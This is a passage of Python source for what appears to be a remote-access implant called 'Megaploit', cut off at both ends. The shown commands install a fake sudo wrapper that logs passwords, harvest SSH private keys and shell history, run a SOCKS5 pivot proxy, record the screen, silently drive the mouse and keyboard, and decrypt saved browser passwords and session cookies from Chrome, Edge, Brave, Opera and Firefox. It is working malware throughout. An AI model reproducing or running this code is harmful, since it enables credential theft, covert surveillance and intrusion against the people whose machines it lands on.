        return f"[+] DLL '{dll_path}' injected into PID {pid} via LoadLibraryA — TID {tid.value}"
    except Exception as e:
        return f"[-] dll_inject: {e}"


# ---------------------------------------------------------------------------
# sudo/su credential sniffing — intercept password via LD_PRELOAD fake sudo
# ---------------------------------------------------------------------------

@_register("sudo_sniff")
def _sudo_sniff(conn, args: list[str]) -> str:
    """
    Deploy a fake 'sudo' wrapper into a user-writable directory on PATH that
    captures the next sudo password, logs it, then passes execution through to
    the real sudo transparently.
    Unix only. Requires a writable directory earlier on PATH than /usr/bin.
    Usage: sudo_sniff [log_path]
    Default log_path: /tmp/.ssniff
    """
    if sys.platform == "win32":
        return "[-] sudo_sniff is Unix-only"

    log_path = args[0] if args else "/tmp/.ssniff"

    # Find first writable PATH dir that comes before real sudo
    real_sudo = shutil.which("sudo") or "/usr/bin/sudo"
    target_dir: str | None = None
    path_dirs = os.environ.get("PATH", "").split(":")
    for d in path_dirs:
        if not d:
            continue
        real_in_dir = os.path.join(d, "sudo")
        if real_in_dir == real_sudo:
            break   # don't shadow after real sudo
        if os.access(d, os.W_OK):
            target_dir = d
            break

    if not target_dir:
        return ("[-] No writable PATH directory before real sudo found.\n"
                f"    Real sudo: {real_sudo}\n"
                f"    PATH: {os.environ.get('PATH','')}")

    fake_sudo = os.path.join(target_dir, "sudo")
    wrapper = f"""#!/bin/sh
# Megaploit sudo_sniff wrapper
read -s -p "[sudo] password for $(whoami): " PW
echo
echo "$PW" >> {log_path}
{real_sudo} "$@"
"""
    try:
        with open(fake_sudo, "w") as f:
            f.write(wrapper)
        os.chmod(fake_sudo, 0o755)
        return (f"[+] Fake sudo installed at {fake_sudo}\n"
                f"    Passwords will be captured to {log_path}\n"
                f"    Retrieve with: sudo_sniff_read  (or  download {log_path})")
    except Exception as e:
        return f"[-] sudo_sniff: {e}"


@_register("sudo_sniff_read")
def _sudo_sniff_read(conn, args: list[str]) -> str:
    """
    Read back passwords captured by sudo_sniff.
    Usage: sudo_sniff_read [log_path]
    Default log_path: /tmp/.ssniff
    """
    if sys.platform == "win32":
        return "[-] sudo_sniff_read is Unix-only"
    log_path = args[0] if args else "/tmp/.ssniff"
    if not os.path.isfile(log_path):
        return f"[-] Log not found: {log_path}  (has anyone used sudo since planting?)"
    try:
        with open(log_path, "r", errors="replace") as f:
            content = f.read().strip()
        return content if content else "(no passwords captured yet)"
    except PermissionError:
        return f"[-] Permission denied reading: {log_path}"
    except Exception as e:
        return f"[-] sudo_sniff_read: {e}"


@_register("sudo_sniff_clean")
def _sudo_sniff_clean(conn, args: list[str]) -> str:
    """
    Remove the fake sudo wrapper and its log file.
    Usage: sudo_sniff_clean [log_path]
    Default log_path: /tmp/.ssniff
    """
    if sys.platform == "win32":
        return "[-] sudo_sniff_clean is Unix-only"
    log_path = args[0] if args else "/tmp/.ssniff"
    messages: list[str] = []

    # Identify and remove fake sudo from PATH dirs
    real_sudo = shutil.which("sudo") or "/usr/bin/sudo"
    for d in os.environ.get("PATH", "").split(":"):
        if not d:
            continue
        candidate = os.path.join(d, "sudo")
        if candidate == real_sudo:
            break
        if os.path.isfile(candidate):
            try:
                os.remove(candidate)
                messages.append(f"[+] Removed fake sudo: {candidate}")
            except Exception as e:
                messages.append(f"[-] Could not remove {candidate}: {e}")

    # Remove the log file
    if os.path.isfile(log_path):
        try:
            os.remove(log_path)
            messages.append(f"[+] Removed log: {log_path}")
        except Exception as e:
            messages.append(f"[-] Could not remove log {log_path}: {e}")
    else:
        messages.append(f"[*] Log not found (already removed?): {log_path}")

    return "\n".join(messages) if messages else "[-] Nothing to clean"


# ---------------------------------------------------------------------------
# SSH key + known_hosts harvest
# ---------------------------------------------------------------------------

@_register("ssh_harvest")
def _ssh_harvest(conn, args: list[str]) -> str:
    """
    Collect all SSH private keys, known_hosts, and authorized_keys files
    from the target's home directory (and /root if accessible).
    Returns a combined text dump.
    """
    home = os.path.expanduser("~")
    search_roots = [home]
    if home != "/root" and os.path.isdir("/root"):
        search_roots.append("/root")

    lines: list[str] = []
    interesting = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
                   "known_hosts", "authorized_keys", "config"}

    for root in search_roots:
        ssh_dir = os.path.join(root, ".ssh")
        if not os.path.isdir(ssh_dir):
            continue
        lines.append(f"\n=== {ssh_dir} ===")
        for fname in sorted(os.listdir(ssh_dir)):
            fpath = os.path.join(ssh_dir, fname)
            if not os.path.isfile(fpath):
                continue
            try:
                with open(fpath, "r", errors="replace") as f:
                    content = f.read()
                lines.append(f"\n--- {fname} ---")
                lines.append(content[:8192])   # cap per file at 8 KB
                if len(content) > 8192:
                    lines.append(f"... ({len(content)} bytes total, truncated)")
            except PermissionError:
                lines.append(f"--- {fname}: permission denied ---")
            except OSError as e:
                lines.append(f"--- {fname}: {e} ---")

    # Also grab bash/zsh history for SSH commands
    for hist_file in (".bash_history", ".zsh_history", ".history"):
        hpath = os.path.join(home, hist_file)
        if os.path.isfile(hpath):
            try:
                with open(hpath, "r", errors="replace") as f:
                    content = f.read()
                ssh_lines = [l for l in content.splitlines() if "ssh" in l.lower()]
                if ssh_lines:
                    lines.append(f"\n=== {hist_file} (SSH commands) ===")
                    lines.append("\n".join(ssh_lines[-50:]))  # last 50
            except OSError:
                pass

    return "\n".join(lines) if lines else "[-] No SSH files found"


# ---------------------------------------------------------------------------
# Reverse SOCKS5 proxy — tunnel all operator traffic through the target
# ---------------------------------------------------------------------------

@_register("socks5")
def _socks5(conn, args: list[str]) -> str:
    """
    Start a SOCKS5 proxy server on the agent machine.
    The operator then configures their tools (proxychains, curl, etc.) to use
    agent_ip:port as a SOCKS5 proxy to reach the target's internal network.
    Usage: socks5 <port>   (default: 1080)
    """
    port = 1080
    if args and args[0].isdigit():
        port = int(args[0])

    import socket as _sock
    import struct

    def _handle(client: _sock.socket) -> None:
        """Minimal SOCKS5 implementation (no-auth)."""
        try:
            # Auth negotiation
            header = client.recv(2)
            if len(header) < 2:
                return
            n_methods = header[1]
            client.recv(n_methods)  # discard methods
            client.sendall(b"\x05\x00")  # no auth

            # Request
            req = client.recv(4)
            if len(req) < 4 or req[1] != 0x01:
                client.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
                return
            atype = req[3]
            if atype == 0x01:    # IPv4
                host = _sock.inet_ntoa(client.recv(4))
            elif atype == 0x03:  # domain
                dlen = client.recv(1)[0]
                host = client.recv(dlen).decode()
            elif atype == 0x04:  # IPv6
                host = _sock.inet_ntop(_sock.AF_INET6, client.recv(16))
            else:
                client.sendall(b"\x05\x08\x00\x01" + b"\x00" * 6)
                return
            port_bytes = client.recv(2)
            dst_port   = struct.unpack("!H", port_bytes)[0]

            try:
                remote = _sock.create_connection((host, dst_port), timeout=10)
                bound  = remote.getsockname()
                reply  = (b"\x05\x00\x00\x01" +
                          _sock.inet_aton(bound[0]) +
                          struct.pack("!H", bound[1]))
                client.sendall(reply)
            except OSError as e:
                client.sendall(b"\x05\x05\x00\x01" + b"\x00" * 6)
                return

            # Relay
            def _relay(src, dst):
                try:
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.sendall(data)
                except OSError:
                    pass
                finally:
                    for s in (src, dst):
                        try:
                            s.close()
                        except OSError:
                            pass

            threading.Thread(target=_relay, args=(client, remote), daemon=True).start()
            threading.Thread(target=_relay, args=(remote, client), daemon=True).start()

        except Exception:
            try:
                client.close()
            except OSError:
                pass

    def _accept(server: _sock.socket) -> None:
        while True:
            try:
                client, _ = server.accept()
                threading.Thread(target=_handle, args=(client,), daemon=True).start()
            except OSError:
                break

    try:
        srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(32)
        threading.Thread(target=_accept, args=(srv,), daemon=True).start()
        return (f"[+] SOCKS5 proxy listening on 0.0.0.0:{port}\n"
                f"    Use:  proxychains4 -q <tool>  (set socks5 127.0.0.1 {port} in proxychains.conf)\n"
                f"    Or:   curl --socks5 <agent_ip>:{port} http://internal-host/")
    except OSError as e:
        return f"[-] socks5: {e}"


# ---------------------------------------------------------------------------
# Screen-record — capture a video of the desktop (MJPEG → AVI via opencv)
# ---------------------------------------------------------------------------

@_register("screenrecord")
def _screenrecord(conn, args: list[str]) -> str | None:
    """
    Record the target's screen for N seconds and send back an MP4.
    Usage: screenrecord <seconds> [fps] [scale]
      fps   — target frame rate (default 12, max 30)
      scale — output width in pixels (default 1280); height is auto-scaled

    Optimisations vs original:
    - Precise frame pacing using time.monotonic() instead of sleep(1/fps),
      which eliminates drift on slow machines and maintains constant FPS.
    - Frames are downscaled before encoding (default 1280 px wide) —
      reduces encoder work and file size without visible quality loss for
      screen recordings.
    - mp4v codec in an .mp4 container gives much better compression than
      XVID/AVI with zero extra dependencies.
    - On overrun (frame took longer than one tick) the loop skips sleep
      instead of drifting behind — keeps wall-clock duration accurate.
    """
    if not args or not args[0].isdigit():
        return "Usage: screenrecord <seconds> [fps] [scale_width]"
    seconds     = min(int(args[0]), 300)
    fps         = min(int(args[1]) if len(args) > 1 and args[1].isdigit() else 12, 30)
    scale_width = int(args[2]) if len(args) > 2 and args[2].isdigit() else 1280

    try:
        import cv2
        import mss
        import numpy as np

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            src_w, src_h = monitor["width"], monitor["height"]

        # Compute scaled dimensions preserving aspect ratio
        scale_h = int(src_h * scale_width / src_w)
        # Ensure even dimensions (required by many codecs)
        out_w = scale_width + (scale_width % 2)
        out_h = scale_h     + (scale_h % 2)

        out_path = "_screenrec.mp4"
        fourcc   = cv2.VideoWriter_fourcc(*"mp4v")
        writer   = cv2.VideoWriter(out_path, fourcc, fps, (out_w, out_h))

        tick     = 1.0 / fps
        deadline = time.monotonic() + tick

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            end_time = time.monotonic() + seconds
            while time.monotonic() < end_time:
                raw = sct.grab(monitor)
                arr = np.array(raw)
                bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
                if (src_w, src_h) != (out_w, out_h):
                    bgr = cv2.resize(bgr, (out_w, out_h), interpolation=cv2.INTER_LINEAR)
                writer.write(bgr)
                # Precise sleep: sleep only the remaining time in this tick
                now = time.monotonic()
                wait = deadline - now
                if wait > 0:
                    time.sleep(wait)
                deadline += tick   # advance deadline regardless of overrun

        writer.release()

        with _send_lock:
            _send_msg(conn, "FILE_OK")
            _send_file(conn, out_path)
        try:
            os.remove(out_path)
        except OSError:
            pass
        return None
    except ImportError:
        pass  # fall through to ffmpeg path
    except Exception as e:
        return f"[-] screenrecord (cv2/mss path): {e}"

    # ── ffmpeg fallback ───────────────────────────────────────────────────────
    if not shutil.which("ffmpeg"):
        return "[-] screenrecord requires opencv-python+mss OR ffmpeg in PATH"
    try:
        out_path = "_screenrec.mp4"
        if sys.platform == "darwin":
            # macOS: use avfoundation (screen capture device index 1)
            cmd = [
                "ffmpeg", "-y",
                "-f", "avfoundation", "-framerate", str(fps),
                "-i", "1:none",
                "-t", str(seconds),
                "-vf", f"scale={scale_width}:-2",
                "-vcodec", "libx264", "-preset", "ultrafast",
                "-pix_fmt", "yuv420p",
                out_path,
            ]
        elif sys.platform == "win32":
            # Windows: use gdigrab
            cmd = [
                "ffmpeg", "-y",
                "-f", "gdigrab", "-framerate", str(fps),
                "-i", "desktop",
                "-t", str(seconds),
                "-vf", f"scale={scale_width}:-2",
                "-vcodec", "libx264", "-preset", "ultrafast",
                "-pix_fmt", "yuv420p",
                out_path,
            ]
        else:
            # Linux: try x11grab; fall back to wayland/pipewire via kmsgrab
            display = os.environ.get("DISPLAY", ":0")
            cmd = [
                "ffmpeg", "-y",
                "-f", "x11grab", "-framerate", str(fps),
                "-i", display,
                "-t", str(seconds),
                "-vf", f"scale={scale_width}:-2",
                "-vcodec", "libx264", "-preset", "ultrafast",
                "-pix_fmt", "yuv420p",
                out_path,
            ]
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                              timeout=seconds + 30)
        if not os.path.isfile(out_path):
            return "[-] ffmpeg completed but output file not found"
        with _send_lock:
            _send_msg(conn, "FILE_OK")
            _send_file(conn, out_path)
        try:
            os.remove(out_path)
        except OSError:
            pass
        return None
    except subprocess.TimeoutExpired:
        return "[-] screenrecord (ffmpeg): timed out"
    except subprocess.CalledProcessError as e:
        return f"[-] screenrecord (ffmpeg): exited with code {e.returncode}"
    except Exception as e:
        return f"[-] screenrecord (ffmpeg): {e}"


# ---------------------------------------------------------------------------
# Mouse control — silently move/click the mouse
# ---------------------------------------------------------------------------

@_register("mouse_move")
def _mouse_move(conn, args: list[str]) -> str:
    """
    Silently move the mouse to (x, y) and optionally click.
    Usage: mouse_move <x> <y> [click]
    Example: mouse_move 960 540 click
    """
    if len(args) < 2 or not args[0].isdigit() or not args[1].isdigit():
        return "Usage: mouse_move <x> <y> [click]"
    if not _HAS_GUI:
        return "[-] pyautogui not available"
    x, y = int(args[0]), int(args[1])
    do_click = len(args) >= 3 and args[2].lower() == "click"
    try:
        pyautogui.moveTo(x, y, duration=0.1)
        if do_click:
            pyautogui.click(x, y)
            return f"[+] Mouse moved to ({x},{y}) and clicked"
        return f"[+] Mouse moved to ({x},{y})"
    except Exception as e:
        return f"[-] mouse_move: {e}"


# ---------------------------------------------------------------------------
# Keyboard injection — silently type text or press hotkeys
# ---------------------------------------------------------------------------

@_register("type_keys")
def _type_keys(conn, args: list[str]) -> str:
    """
    Silently type a string into whatever window currently has focus, or
    press a key combination.
    Usage: type_keys text <string to type>
           type_keys hotkey <key1> [key2] [key3]
    Examples:
      type_keys text hello world
      type_keys hotkey ctrl c
      type_keys hotkey win r
    """
    if not _HAS_GUI:
        return "[-] pyautogui not available"
    if len(args) < 2:
        return "Usage: type_keys text <string>  OR  type_keys hotkey <key> [key2] [key3]"
    mode = args[0].lower()
    try:
        if mode == "text":
            text = " ".join(args[1:])
            pyautogui.typewrite(text, interval=0.02)
            return f"[+] Typed: {text[:50]}{'...' if len(text) > 50 else ''}"
        elif mode == "hotkey":
            keys = args[1:]
            pyautogui.hotkey(*keys)
            return f"[+] Hotkey: {'+'.join(keys)}"
        else:
            return "Usage: type_keys text <string>  OR  type_keys hotkey <key> [key2] [key3]"
    except Exception as e:
        return f"[-] type_keys: {e}"


# ---------------------------------------------------------------------------
# Browser cookie + saved-password hijacker
# ---------------------------------------------------------------------------
#
# How Chromium (Chrome / Edge / Brave / Opera) stores secrets
# -----------------------------------------------------------
# The encryption key is a 32-byte AES key encrypted with the OS DPAPI and then
# base64-encoded under the "os_crypt.encrypted_key" field of the "Local State"
# JSON file that lives in the *parent* of the "Default" profile directory.
# The AES key header is b"DPAPI", so we strip those 5 bytes before decrypting.
# Each credential / cookie value is then AES-256-GCM encrypted:
#   [b"v10"][12-byte nonce][ciphertext][16-byte tag]
#
# How Firefox stores secrets
# --------------------------
# Cookies:   cookies.sqlite  (host / name / value plaintext in most configs)
# Passwords: logins.json holds base64-encoded ciphertext fields; key4.db holds
#            the NSS-wrapped master key.  Full NSS decryption requires ctypes
#            bindings to libnss3.  We pull the raw logins.json so the operator
#            can decrypt offline, and we include a helper that calls the
#            nss3 library if present.

@_register("browser_creds")
def _browser_creds(conn, args: list[str]) -> str:
    """
    Steal all browser cookies and saved login credentials from:
      Chrome, Edge, Brave, Opera  (Chromium family — Windows/macOS/Linux)
      Firefox                     (all platforms)

    On Windows the Chromium DPAPI key is decrypted in-process via ctypes so
    every password and session cookie is returned in plaintext — no external
    tools needed.

    On Linux the key may be protected by libsecret / kwallet; we fall back to
    returning the raw ciphertext with a note.

    Usage: browser_creds [cookies|passwords|all]
    Default: all
    """
    mode = args[0].lower() if args else "all"
    if mode not in ("cookies", "passwords", "all"):
        return "Usage: browser_creds [cookies|passwords|all]"

    home    = os.path.expanduser("~")
    output: list[str] = []

    # ------------------------------------------------------------------
    # Helper: locate every Chromium-family profile directory
    # ------------------------------------------------------------------
    def _chromium_profiles() -> list[tuple[str, str]]:
        """Return list of (browser_name, Default_profile_dir)."""
        candidates = []
        if sys.platform == "win32":
            local = os.environ.get("LOCALAPPDATA", "")
            roaming = os.environ.get("APPDATA", "")
            roots = [
                ("Chrome",  os.path.join(local,   "Google",    "Chrome",  "User Data")),
                ("Edge",    os.path.join(local,   "Microsoft", "Edge",    "User Data")),
                ("Brave",   os.path.join(local,   "BraveSoftware", "Brave-Browser", "User Data")),
                ("Opera",   os.path.join(roaming, "Opera Software", "Opera Stable")),
                ("Chromium",os.path.join(local,   "Chromium", "User Data")),
            ]
        elif sys.platform == "darwin":
            lib = os.path.join(home, "Library", "Application Support")
            roots = [
                ("Chrome",  os.path.join(lib, "Google",    "Chrome")),
                ("Edge",    os.path.join(lib, "Microsoft", "Edge")),
                ("Brave",   os.path.join(lib, "BraveSoftware", "Brave-Browser")),
                ("Opera",   os.path.join(lib, "com.operasoftware.Opera")),
                ("Chromium",os.path.join(lib, "Chromium")),
            ]
        else:
            cfg = os.path.join(home, ".config")
            roots = [
                ("Chrome",  os.path.join(cfg, "google-chrome")),
                ("Edge",    os.path.join(cfg, "microsoft-edge")),
                ("Brave",   os.path.join(cfg, "BraveSoftware", "Brave-Browser")),
                ("Opera",   os.path.join(cfg, "opera")),
                ("Chromium",os.path.join(cfg, "chromium")),
            ]

        result = []
        for name, user_data in roots:
            # "User Data/Default" pattern (Windows/Linux) or direct profile
            for sub in ("Default", "Profile 1", "Profile 2", ""):
                candidate = os.path.join(user_data, sub) if sub else user_data
                if os.path.isdir(candidate):
                    result.append((name, candidate))
                    break
        return result

    # ------------------------------------------------------------------
    # Helper: decrypt the Chromium AES-256-GCM master key (Windows only)
    # ------------------------------------------------------------------
    def _get_chromium_key_windows(user_data_dir: str) -> bytes | None:
        """Read Local State → base64-decode → DPAPI-decrypt → return raw AES key."""
        local_state = os.path.join(user_data_dir, "Local State")
        if not os.path.isfile(local_state):
            return None
        try:
            import json as _json
            with open(local_state, encoding="utf-8") as f:
                ls = _json.load(f)
            b64_key = ls["os_crypt"]["encrypted_key"]
            import base64
            encrypted_key = base64.b64decode(b64_key)
            # Strip the "DPAPI" prefix (5 bytes)
            if not encrypted_key.startswith(b"DPAPI"):
                return None
            encrypted_key = encrypted_key[5:]
            import ctypes
            import ctypes.wintypes as wt
            # CryptUnprotectData
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
            input_blob = DATA_BLOB(len(encrypted_key),
                                   ctypes.cast(ctypes.c_char_p(encrypted_key),
                                               ctypes.POINTER(ctypes.c_char)))
            output_blob = DATA_BLOB()
            if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(input_blob), None, None, None, None, 0,
                ctypes.byref(output_blob)
            ):
                raw = bytes(output_blob.pbData[i] for i in range(output_blob.cbData))
                ctypes.windll.kernel32.LocalFree(output_blob.pbData)
                return raw
        except Exception:
            pass
        return None

    def _get_chromium_key_linux(user_data_dir: str) -> bytes | None:
        """
        On Linux Chromium protects the key with 'peanuts' (v10) or libsecret/kwallet.
        The hardcoded fallback key for non-keyring setups is b'peanuts' padded to 16 bytes
        with PBKDF2HMAC(sha1, salt=b'saltysalt', iterations=1).
        """
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16,
                             salt=b"saltysalt", iterations=1)
            return kdf.derive(b"peanuts")
        except ImportError:
            return None

    def _get_chromium_key_mac(user_data_dir: str) -> bytes | None:
        """macOS: key is in the Keychain under 'Chrome Safe Storage' etc."""
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            # Try to get the keychain password
            keychain_password = b"peanuts"  # fallback
            try:
                raw = subprocess.check_output(
                    ["security", "find-generic-password", "-wa", "Chrome"],
                    stderr=subprocess.DEVNULL
                ).strip()
                if raw:
                    keychain_password = raw
            except Exception:
                pass
            kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16,
                             salt=b"saltysalt", iterations=1003)
            return kdf.derive(keychain_password)
        except ImportError:
            return None

    def _get_chromium_key(browser: str, profile_dir: str) -> bytes | None:
        user_data_dir = os.path.dirname(profile_dir)
        if sys.platform == "win32":
            return _get_chromium_key_windows(user_data_dir)
        elif sys.platform == "darwin":
            return _get_chromium_key_mac(user_data_dir)
        else:
            return _get_chromium_key_linux(user_data_dir)

    # ------------------------------------------------------------------
    # Helper: AES-256-GCM decrypt a Chromium v10/v20 value
    # ------------------------------------------------------------------
    def _chromium_decrypt(encrypted_value: bytes, key: bytes | None) -> str:
        """Decrypt a Chromium-encrypted blob. Returns plaintext or hex on failure."""
        if not encrypted_value:
            return ""
        # v10/v20 prefix = AES-GCM with 12-byte nonce
        if encrypted_value[:3] in (b"v10", b"v20"):
            if key is None:
                return f"<encrypted-v10: {encrypted_value.hex()[:64]}>"
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                nonce      = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                return AESGCM(key).decrypt(nonce, ciphertext, None).decode("utf-8", errors="replace")
            except Exception as e:
                return f"<decrypt-error: {e}>"
        # Older plaintext or unknown format
        try:
            return encrypted_value.decode("utf-8", errors="replace")
        except Exception:
            return encrypted_value.hex()

    # ------------------------------------------------------------------
    # Chromium: saved passwords  (Login Data DB)
    # ------------------------------------------------------------------
    def _chromium_passwords(browser: str, profile_dir: str, key: bytes | None) -> list[str]:
        db_path = os.path.join(profile_dir, "Login Data")
        if not os.path.isfile(db_path):
            return []
        tmp = db_path + "_mp_tmp"
        rows: list[str] = []
        try:
            shutil.copy2(db_path, tmp)
            db = sqlite3.connect(tmp)
            cur = db.cursor()
            cur.execute(
                "SELECT origin_url, username_value, password_value "
                "FROM logins ORDER BY date_created DESC"
            )
            for url, user, enc_pw in cur.fetchall():
                if isinstance(enc_pw, bytes):
                    pw = _chromium_decrypt(enc_pw, key)
                else:
                    pw = str(enc_pw)
                rows.append(f"    URL : {url}")
                rows.append(f"    USER: {user}")
                rows.append(f"    PASS: {pw}")
                rows.append("")
            db.close()
        except Exception as e:
            rows.append(f"    (error reading Login Data: {e})")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
        return rows

    # ------------------------------------------------------------------
    # Chromium: cookies  (Cookies DB)
    # ------------------------------------------------------------------
    def _chromium_cookies(browser: str, profile_dir: str, key: bytes | None,
                          limit: int = 500) -> list[str]:
        # Chromium ≥ M96 stores cookies in Network/Cookies
        for cookie_path in (
            os.path.join(profile_dir, "Network", "Cookies"),
            os.path.join(profile_dir, "Cookies"),
        ):
            if os.path.isfile(cookie_path):
                break
        else:
            return []
        tmp = cookie_path + "_mp_tmp"
        rows: list[str] = []
        try:
            shutil.copy2(cookie_path, tmp)
            db = sqlite3.connect(tmp)
            cur = db.cursor()
            cur.execute(
                "SELECT host_key, name, encrypted_value, path, "
                "       is_secure, expires_utc "
                "FROM cookies ORDER BY last_access_utc DESC LIMIT ?",
                (limit,)
            )
            for host, name, enc_val, path, secure, expires in cur.fetchall():
                if isinstance(enc_val, bytes):
                    value = _chromium_decrypt(enc_val, key)
                else:
                    value = str(enc_val)
                secure_str = "Secure" if secure else ""
                rows.append(
                    f"    {host:<40} {name:<28} {secure_str:<6} "
                    f"{value[:80]}"
                )
            db.close()
        except Exception as e:
            rows.append(f"    (error reading Cookies: {e})")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
        return rows

    # ------------------------------------------------------------------
    # Firefox: cookies  (cookies.sqlite)
    # ------------------------------------------------------------------
    def _firefox_cookies(profile_dir: str, limit: int = 500) -> list[str]:
        db_path = os.path.join(profile_dir, "cookies.sqlite")
        if not os.path.isfile(db_path):
            return []
        tmp = db_path + "_mp_tmp"
        rows: list[str] = []
        try:
            shutil.copy2(db_path, tmp)
            db = sqlite3.connect(tmp)
            cur = db.cursor()
            cur.execute(
                "SELECT host, name, value, path, isSecure, expiry "
                "FROM moz_cookies ORDER BY lastAccessed DESC LIMIT ?",
                (limit,)
            )
            for host, name, value, path, secure, expiry in cur.fetchall():
                secure_str = "Secure" if secure else ""
                rows.append(
                    f"    {host:<40} {name:<28} {secure_str:<6} "
                    f"{str(value)[:80]}"
                )
            db.close()
        except Exception as e:
            rows.append(f"    (error reading Firefox cookies: {e})")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
        return rows

    # ------------------------------------------------------------------
    # Firefox: saved passwords via NSS (logins.json + key4.db)
    # ------------------------------------------------------------------
    def _firefox_passwords(profile_dir: str) -> list[str]:
        """
        Attempt NSS-based decryption first (requires libnss3 on PATH).
        Falls back to dumping raw logins.json for offline cracking.
        """
        import json as _json
        logins_path = os.path.join(profile_dir, "logins.json")
        key4_path   = os.path.join(profile_dir, "key4.db")
        if not os.path.isfile(logins_path):
            return []

        rows: list[str] = []

        # Try NSS decryption via ctypes
        def _try_nss_decrypt(profile_dir: str) -> dict[str, str] | None:
            """Return {base64_ciphertext: plaintext} map using libnss3."""
            import base64 as _b64
            import ctypes

            # Locate libnss3
            nss_lib = None
            for candidate in (
                "nss3", "libnss3.so", "libnss3.so.1",
                "/usr/lib/x86_64-linux-gnu/libnss3.so",
                "/usr/lib/libnss3.so",
                r"C:\Program Files\Mozilla Firefox\nss3.dll",
                r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
                "/Applications/Firefox.app/Contents/MacOS/libnss3.dylib",
            ):
                try:
                    nss_lib = ctypes.CDLL(candidate)
                    break
                except OSError:
                    continue
            if nss_lib is None:
                return None

            try:
                nss_lib.NSS_Init(profile_dir.encode())

                class SECItem(ctypes.Structure):
                    _fields_ = [("type", ctypes.c_uint),
                                 ("data", ctypes.POINTER(ctypes.c_ubyte)),
                                 ("len",  ctypes.c_uint)]

                results: dict[str, str] = {}
                with open(logins_path) as lf:
                    data = _json.load(lf)
                for login in data.get("logins", []):
                    for field in ("encryptedUsername", "encryptedPassword"):
                        b64 = login.get(field, "")
                        if not b64 or b64 in results:
                            continue
                        raw = _b64.b64decode(b64)
                        inp = SECItem(0,
                                      ctypes.cast(ctypes.c_char_p(raw),
                                                  ctypes.POINTER(ctypes.c_ubyte)),
                                      len(raw))
                        out = SECItem()
                        if nss_lib.PK11SDR_Decrypt(ctypes.byref(inp),
                                                   ctypes.byref(out), None) == 0:
                            plain = bytes(out.data[i] for i in range(out.len))
                            results[b64] = plain.decode("utf-8", errors="replace")
                            nss_lib.SECITEM_FreeItem(ctypes.byref(out), False)
                        else:
                            results[b64] = "<NSS-decrypt-failed>"

                nss_lib.NSS_Shutdown()
                return results
            except Exception:
                try:
                    nss_lib.NSS_Shutdown()
                except Exception:
                    pass
                return None

        nss_map = _try_nss_decrypt(profile_dir)

        try:
            with open(logins_path) as lf:
                data = _json.load(lf)
            for login in data.get("logins", []):
                url  = login.get("hostname", "?")
                if nss_map is not None:
                    user = nss_map.get(login.get("encryptedUsername", ""), "<no-nss>")
                    pw   = nss_map.get(login.get("encryptedPassword", ""), "<no-nss>")
                else:
                    user = f"<b64:{login.get('encryptedUsername','')[:40]}>"
                    pw   = f"<b64:{login.get('encryptedPassword','')[:40]}>"
                rows.append(f"    URL : {url}")
                rows.append(f"    USER: {user}")
                rows.append(f"    PASS: {pw}")
                rows.append("")
        except Exception as e:
            rows.append(f"    (error reading logins.json: {e})")

        return rows

    # ------------------------------------------------------------------
    # Locate Firefox profiles
    # ------------------------------------------------------------------
    def _firefox_profile_dirs() -> list[str]:
        dirs = []
        for base in (
            os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
            os.path.join(home, ".mozilla", "firefox"),
            os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
        ):
            if os.path.isdir(base):
                for entry in os.listdir(base):
                    full = os.path.join(base, entry)
                    if os.path.isdir(full) and (
                        os.path.isfile(os.path.join(full, "logins.json")) or
                        os.path.isfile(os.path.join(full, "cookies.sqlite"))
                    ):
                        dirs.append(full)
        return dirs

    # ------------------------------------------------------------------
    # Main collection loop
    # ------------------------------------------------------------------

    # --- Chromium family ---
    for browser, profile_dir in _chromium_profiles():
        key = _get_chromium_key(browser, profile_dir)
        key_status = "DPAPI-decrypted" if key else "key-unavailable"

        if mode in ("passwords", "all"):
            rows = _chromium_passwords(browser, profile_dir, key)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  {browser} — Saved Passwords  ({key_status})")
                output.append(f"{'='*60}")
                output.extend(rows)

        if mode in ("cookies", "all"):
            rows = _chromium_cookies(browser, profile_dir, key)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  {browser} — Cookies  ({key_status})")
                output.append(f"  {'HOST':<40} {'NAME':<28} {'SEC':<6} VALUE")
                output.append(f"  {'─'*100}")
                output.extend(rows)

    # --- Firefox ---
    for ff_dir in _firefox_profile_dirs():
        if mode in ("passwords", "all"):
            rows = _firefox_passwords(ff_dir)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  Firefox — Saved Passwords  ({os.path.basename(ff_dir)})")
                output.append(f"{'='*60}")
                output.extend(rows)

        if mode in ("cookies", "all"):
            rows = _firefox_cookies(ff_dir)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  Firefox — Cookies  ({os.path.basename(ff_dir)})")
                output.append(f"  {'HOST':<40} {'NAME':<28} {'SEC':<6} VALUE")
                output.append(f"  {'─'*100}")
                output.extend(rows)

    if not output:
        return (
            "[-] No browser data found.\n"
            "    Checked: Chrome, Edge, Brave, Opera, Chromium, Firefox\n"
